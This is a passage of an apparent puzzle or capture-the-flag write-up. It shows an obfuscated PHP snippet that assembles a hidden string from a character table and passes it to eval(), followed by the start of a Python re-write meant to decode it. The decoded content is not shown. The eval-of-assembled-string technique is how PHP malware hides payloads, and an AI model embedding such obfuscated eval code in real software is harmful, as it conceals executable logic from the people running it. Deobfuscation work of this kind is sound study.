#93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">79</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">27</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">3</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">88</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">35</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">73</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">35</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">15</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">27</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">77</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">52</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">31</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">27</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">77</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">35</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">73</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">21</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">77</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">6</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">6</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">21</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">82</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">82</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">29</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">29</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">);</span>

<span style="color: #268BD2">$do_me</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>

<span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #268BD2">$i</span><span style="color: #719e07">=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span><span style="color: #268BD2">$i</span><span style="color: #719e07">&lt;</span><span style="color: #B58900">count</span><span style="color: #93A1A1">(</span><span style="color: #268BD2">$order</span><span style="color: #93A1A1">);</span><span style="color: #268BD2">$i</span><span style="color: #719e07">++</span><span style="color: #93A1A1">)</span> 
<span style="color: #93A1A1">{</span>
	<span style="color: #268BD2">$do_me</span><span style="color: #719e07">=</span><span style="color: #268BD2">$do_me</span><span style="color: #719e07">.</span><span style="color: #268BD2">$terms</span><span style="color: #93A1A1">[</span><span style="color: #268BD2">$order</span><span style="color: #93A1A1">[</span><span style="color: #268BD2">$i</span><span style="color: #93A1A1">]];</span>
<span style="color: #93A1A1">}</span>

<span style="color: #719e07">eval</span><span style="color: #93A1A1">(</span><span style="color: #268BD2">$do_me</span><span style="color: #93A1A1">);</span> 
<span style="color: #719e07">?&gt;</span><span style="color: #CB4B16"></span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Find an online tool to run this PHP code or re-write it in Python . My Python code:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Code re-written in Python</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">terms</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">[</span><span style="color: #2AA198">&quot;M&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Z&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;]&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;p&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\\</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;w&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;f&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;1&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;v&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&lt;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;a&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Q&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;z&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot; &quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;s&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;m&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;+&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;E&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;D&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;g&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;W&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\&quot;</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;q&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;y&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;T&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;V&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;n&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;S&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;X&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;)&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;9&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;C&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;P&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;r&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&amp;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\&#39;</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;!&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;x&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;G&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;:&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;2&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;~&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;O&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;h&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;u&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;U&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;@&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;H&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;3&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;F&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;6&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;b&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;L&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;&gt;&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;^&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;,&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;.&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;l&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;$&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;d&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;`&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;%&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;N&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;*&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;[&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;0&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;}&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;J&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;-&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;5&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;_&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;A&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;=&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;{&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;k&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;o&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;7&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;#&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;i&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;I&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Y&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;(&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;j&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;/&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;?&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;K&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;c&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;B&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;t&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;R&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;4&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;8&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;e&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;|&quot;</span><span style="color: #93A1A1">]</span>

<span style="color: #93A1A1">order</span><span style="color: #719e07">=</span> <span style="color: #93A1A1">[</span><span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">73</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">13</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">35</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">76</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">76</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">60</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">60</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: 